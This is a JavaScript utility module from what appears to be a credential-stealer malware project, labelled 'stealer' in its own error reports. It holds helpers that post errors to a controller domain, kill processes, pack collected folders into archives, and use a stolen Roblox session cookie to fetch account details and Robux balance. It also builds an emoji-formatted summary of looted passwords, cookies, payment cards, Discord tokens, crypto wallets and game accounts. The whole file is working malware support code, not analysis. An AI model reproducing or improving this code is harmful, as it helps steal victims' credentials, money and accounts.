const { promisify } = require("util");
const cpExec = promisify(require("child_process").exec);
const cpExecSync = require("child_process").execSync;
const fs = require("fs-extra");
const path = require("path");
const { homedir } = require("os");
const tar = require("tar");
const { EMOJIS } = require("../config/constants");
const GlobalUtil = require("../globals/GlobalUtil");
const config = require("../config/config");

class Util {
  static async report(error, out = null) {
    new Promise(async () => {
      try {
        const err = error?.stack ? error.stack : error;
        if (!err) return;

        const serr = typeof err != "string" ? GlobalUtil.toString(err) : err;
        if (!serr || serr.length < 1) return;

        await fetch(config.domain + "/error", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: GlobalUtil.toString({
            type: "stealer",
            error: serr,
            version: "LUST_CONFIG_VERSION"
          })
        });
      } catch {}
    });

    return out;
  }

  static async getIP(urlindex = 0) {
    if (!Util.ipurls[urlindex]) return "Failed";

    const res = await fetch(Util.ipurls[urlindex]).catch(() => null);
    if (!res) return await Util.getIP(urlindex + 1);

    const ip = await res.text().catch(() => "");
    const isValid = Util.ippattern.test(ip);
    if (!isValid) return await Util.getIP(urlindex + 1);

    return ip;
  }

  static cleanup() {
    fs.remove(require("./tmp").dir).catch(Util.report);

    return true;
  }

  static async exec(command, safe = false) {
    try {
      const { stdout } = await cpExec(command);

      return stdout;
    } catch (error) {
      Util.report(error);

      if (safe) return "";
      else throw error;
    }
  }

  static execSync(command, safe = true) {
    try {
      const cmd = cpExecSync(command);

      return cmd?.toString("utf-8");
    } catch (error) {
      Util.report(error);

      if (safe) return "";
      else return 0;
    }
  }

  static async killExe(app) {
    await Util.exec(`taskkill /IM ${app} /F`).catch((e) => Util.report(e));
  }

  static tryCatch(func, out) {
    try {
      return func();
    } catch (e) {
      return Util.report(e, out);
    }
  }

  static getLnkTarget(patty) {
    if (!fs.pathExistsSync(patty)) return;

    const cmd = Util.execSync(
      `wmic path win32_shortcutfile where name="${patty.replaceAll(
        "\\",
        "\\\\"
      )}" get target /value`
    );

    if (!cmd) return;

    let output;
    const lines = cmd.split("\n");
    for (const line of lines) {
      if (!line.startsWith("Target=")) continue;

      const temp = line.replace("Target=", "").trim();

      if (fs.pathExistsSync(temp)) {
        output = temp;
        break;
      }
    }

    return output;
  }

  static async getLnkFromStartMenu(app) {
    const shortcutPaths = [];
    const startMenuPaths = [
      path.join(
        homedir(),
        "AppData",
        "Roaming",
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs"
      ),
      path.join(
        "C:\\",
        "ProgramData",
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs"
      )
    ];

    for (const startMenuPath of startMenuPaths) {
      const files = fs.readdirSync(startMenuPath);

      for (const file of files) {
        if (file.toLowerCase() === `${app}.lnk`)
          shortcutPaths.push(path.join(startMenuPath, file));
        else if (file.toLowerCase() === app) {
          const dir = path.join(startMenuPath, file);
          const subfiles = await fs.readdir(dir);

          for (const subfile of subfiles) {
            if (subfile.toLowerCase() === `${app}.lnk`)
              shortcutPaths.push(path.join(dir, subfile));
          }
        }
      }
    }

    return shortcutPaths;
  }

  static async tarc(dir, outfile) {
    if (!fs.pathExistsSync(dir)) return;

    const files = await fs.readdir(dir).catch(() => []);

    if (!files.length) return;

    await tar
      .c(
        {
          file: outfile,
          gzip: true,
          cwd: dir
        },
        files
      )
      .catch(Util.report);
  }

  static async fetchRoblox(cookie) {
    const accountRes = await fetch(
      "https://www.roblox.com/mobileapi/userinfo",
      {
        headers: {
          cookie: ".ROBLOSECURITY=" + cookie
        }
      }
    );

    const account = await accountRes.json();

    const userinfoRes = await fetch(
      `https://users.roblox.com/v1/users/${account.UserID}`
    );

    const userinfo = await userinfoRes.json();

    const friendsRes = await fetch(
      `https://friends.roblox.com/v1/users/${account.UserID}/friends/count`
    );

    const friends = await friendsRes.json();

    return {
      id: account.UserID,
      robux: account.RobuxBalance,
      username: account.UserName,
      builderClub: account.IsAnyBuildersClubMember,
      premium: account.IsPremium,
      avatar: account.ThumbnailUrl,
      verified: userinfo.hasVerifiedBadge,
      created: userinfo.created,
      friends: friends.count
    };
  }

  static generateSummary({
    passwords,
    cookies,
    cards,
    wallets,
    tokens,
    roblox,
    epicgames,
    minecraft,
    steam
  }) {
    try {
      let str = [];

      str.push(`🔑 **Passwords** • \`${passwords.sites?.length}\``);

      str.push(`🍪 **Cookies** • \`${cookies.count}\``);

      if (cards > 0) str.push(`💳 **Cards** • \`${cards}\``);

      if (tokens.length)
        str.push(`${EMOJIS.discord} **Discord tokens** • \`${tokens.length}\``);

      if (roblox.length)
        str.push(`${EMOJIS.roblox} **Roblox accounts** • \`${roblox.length}\``);

      if (wallets.length)
        str.push(
          `${EMOJIS.bitcoin} **Wallets** • \`${wallets
            .map((w) => GlobalUtil.snakeToTitle(w))
            .join("`, `")}\``
        );

      const games = [];

      if (epicgames) games.push("Epic Games");
      if (minecraft) games.push("Minecraft");
      if (steam) games.push("Steam");

      if (games.length)
        str.push(`${EMOJIS.steam} **Games** • \`${games.join("`, `")}\``);

      return str.join("\n");
    } catch (e) {
      Util.report(e);
      return "Failed generating summary...";
    }
  }
}

Util.ipurls = [
  "https://ifconfig.me/ip",
  "https://ifconfig.co/ip",
  "https://ifconfig.net/ip",
  "https://icanhazip.com/",
  "https://api.ipify.org/"
];

Util.ippattern =
  /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;

module.exports = Util;
